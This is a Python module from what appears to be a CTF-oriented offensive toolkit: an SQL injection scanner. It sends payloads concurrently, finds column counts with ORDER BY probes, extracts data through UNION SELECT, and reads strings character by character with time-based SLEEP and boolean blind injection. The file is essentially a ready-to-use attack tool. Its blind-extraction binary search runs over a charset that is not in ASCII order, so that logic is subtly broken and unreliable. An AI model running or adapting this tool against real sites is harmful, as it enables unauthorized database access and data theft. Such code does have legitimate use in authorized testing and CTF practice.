"""SQL Injection scanner module."""

import asyncio
from typing import Optional, Callable
from rich.progress import Progress, TaskID

from ..base import AttackModule
from ...core.context import AttackContext
from ...core.http_client import Response
from ...core.response_analyzer import AnalysisResult
from ...utils.logger import console, log_info, log_success, log_warning, log_vulnerable, create_progress
from ...utils.flag_extractor import FlagExtractor
from .templates import get_payloads, SQLI_TEMPLATES
from .substitution import substitute_placeholders


class SqliScanner(AttackModule):
    """SQL Injection vulnerability scanner."""

    @property
    def name(self) -> str:
        return "SQL Injection Scanner"

    @property
    def description(self) -> str:
        return "Scans for SQL Injection vulnerabilities using various techniques"

    def __init__(self, ctx: AttackContext, db_type: str = "generic"):
        """
        Initialize SQLi scanner.

        Args:
            ctx: Attack context
            db_type: Target database type (mysql, mssql, oracle, postgresql, sqlite, generic)
        """
        super().__init__(ctx)
        self.db_type = db_type
        self.flag_extractor = FlagExtractor()
        self.vulnerable_payloads: list[dict] = []

    async def scan(
        self,
        payloads: Optional[list[str]] = None,
        attack_types: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None
    ) -> list[dict]:
        """
        Scan target for SQL Injection vulnerabilities.

        Args:
            payloads: Custom payloads (if None, uses built-in)
            attack_types: Attack types to test (basic, error_based, time_blind, boolean_blind)
            on_finding: Callback function when vulnerability found

        Returns:
            List of findings
        """
        # Get payloads
        if payloads is None:
            payloads = self._get_default_payloads(attack_types)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} payloads against {self.ctx.target_url}")
            log_info(f"Target parameter: {self.ctx.inject_param}")
            log_info(f"Database type: {self.db_type}")

        # Setup baseline
        await self.setup()

        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning...", total=len(payloads))

            # Create semaphore for concurrent requests
            semaphore = asyncio.Semaphore(self.ctx.threads)

            async def test_with_semaphore(payload: str):
                async with semaphore:
                    return await self._test_single_payload(payload)

            # Run tests concurrently
            tasks = [test_with_semaphore(p) for p in payloads]

            for coro in asyncio.as_completed(tasks):
                result = await coro
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

                    if self.ctx.verbose:
                        log_vulnerable(
                            self.ctx.target_url,
                            self.ctx.inject_param or "unknown",
                            result["payload"]
                        )

        await self.cleanup()

        self.results = findings
        return findings

    def scan_sync(
        self,
        payloads: Optional[list[str]] = None,
        attack_types: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None
    ) -> list[dict]:
        """Synchronous scan."""
        if payloads is None:
            payloads = self._get_default_payloads(attack_types)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} payloads against {self.ctx.target_url}")

        self.setup_sync()
        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning...", total=len(payloads))

            for payload in payloads:
                result = self._test_single_payload_sync(payload)
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

        self.cleanup_sync()
        self.results = findings
        return findings

    async def _test_single_payload(self, payload: str) -> Optional[dict]:
        """Test a single payload asynchronously."""
        try:
            response, analysis = await self.test_payload(payload)

            # Check for flags in response
            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            if analysis.is_vulnerable:
                finding = {
                    "type": f"SQLi ({analysis.detection_method})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": analysis.evidence,
                    "confidence": analysis.confidence,
                    "db_type": analysis.details.get("db_type", self.db_type),
                    "detection_method": analysis.detection_method,
                    "flags_found": flags,
                    "response_length": response.content_length,
                    "response_time": response.elapsed,
                }
                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing payload: {e}")

        return None

    def _test_single_payload_sync(self, payload: str) -> Optional[dict]:
        """Test a single payload synchronously."""
        try:
            response, analysis = self.test_payload_sync(payload)

            # Check for flags
            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            if analysis.is_vulnerable:
                finding = {
                    "type": f"SQLi ({analysis.detection_method})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": analysis.evidence,
                    "confidence": analysis.confidence,
                    "db_type": analysis.details.get("db_type", self.db_type),
                    "detection_method": analysis.detection_method,
                    "flags_found": flags,
                }
                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing payload: {e}")

        return None

    def _get_default_payloads(self, attack_types: Optional[list[str]] = None) -> list[str]:
        """Get default payloads based on attack types."""
        if attack_types is None:
            attack_types = ["basic", "error_based", "boolean_blind"]

        payloads = []
        for attack_type in attack_types:
            payloads.extend(get_payloads(
                db_type=self.db_type,
                attack_type=attack_type,
                delay=int(self.ctx.time_threshold)
            ))

        return list(set(payloads))  # Remove duplicates

    async def detect_columns(self, max_columns: int = 20) -> Optional[int]:
        """
        Detect number of columns using ORDER BY technique.

        Args:
            max_columns: Maximum columns to test

        Returns:
            Number of columns or None if detection failed
        """
        log_info("Detecting number of columns...")

        # Binary search for column count
        low, high = 1, max_columns

        while low <= high:
            mid = (low + high) // 2
            payload = f"' ORDER BY {mid}--"

            response = await self.client.request_with_payload(payload)

            # If no error, columns >= mid
            has_error = any(
                pattern in response.text.lower()
                for pattern in ["error", "unknown column", "order by"]
            )

            if has_error:
                high = mid - 1
            else:
                low = mid + 1

        if high > 0:
            log_success(f"Detected {high} columns")
            return high

        return None

    async def extract_data_union(
        self,
        num_columns: int,
        query: str,
        inject_position: int = 1
    ) -> Optional[str]:
        """
        Extract data using UNION-based injection.

        Args:
            num_columns: Number of columns in query
            query: SQL query to inject
            inject_position: Column position to inject data

        Returns:
            Extracted data or None
        """
        columns = ["NULL"] * num_columns
        columns[inject_position - 1] = f"({query})"
        columns_str = ",".join(columns)

        if self.db_type == "oracle":
            payload = f"' UNION SELECT {columns_str} FROM dual--"
        else:
            payload = f"' UNION SELECT {columns_str}--"

        response = await self.client.request_with_payload(payload)

        # Try to extract data from response
        # This is a simple implementation - in practice you'd need
        # more sophisticated parsing based on the application's response format

        return response.text


class BlindSqliExtractor:
    """Helper class for blind SQL injection data extraction."""

    def __init__(self, scanner: SqliScanner, technique: str = "time"):
        """
        Initialize extractor.

        Args:
            scanner: SQLi scanner instance
            technique: "time" or "boolean"
        """
        self.scanner = scanner
        self.technique = technique

    async def extract_string(
        self,
        query: str,
        max_length: int = 100,
        charset: Optional[str] = None
    ) -> str:
        """
        Extract string character by character.

        Args:
            query: SQL query that returns a string
            max_length: Maximum string length
            charset: Characters to test

        Returns:
            Extracted string
        """
        if charset is None:
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}!@#$%^&*()"

        result = ""

        for pos in range(1, max_length + 1):
            char = await self._extract_char_binary(query, pos, charset)
            if char is None:
                break
            result += char

            if self.scanner.ctx.verbose:
                log_info(f"Extracted: {result}")

        return result

    async def _extract_char_binary(
        self,
        query: str,
        position: int,
        charset: str
    ) -> Optional[str]:
        """Extract single character using binary search."""
        low, high = 0, len(charset) - 1

        while low <= high:
            mid = (low + high) // 2
            char = charset[mid]

            if self.technique == "time":
                condition = f"ASCII(SUBSTRING(({query}),{position},1))>{ord(char)}"
                payload = f"' AND IF({condition},SLEEP({self.scanner.ctx.time_threshold}),0)--"
            else:
                condition = f"ASCII(SUBSTRING(({query}),{position},1))>{ord(char)}"
                payload = f"' AND {condition}--"

            response = await self.scanner.client.request_with_payload(payload)

            if self.technique == "time":
                is_true = response.elapsed > self.scanner.ctx.time_threshold * 0.8
            else:
                # Boolean: compare with baseline
                is_true = self.scanner.analyzer.is_boolean_diff(
                    response,
                    self.scanner.analyzer.baseline
                )

            if is_true:
                low = mid + 1
            else:
                high = mid - 1

        if low > 0 and low <= len(charset):
            return charset[low - 1]
        return None
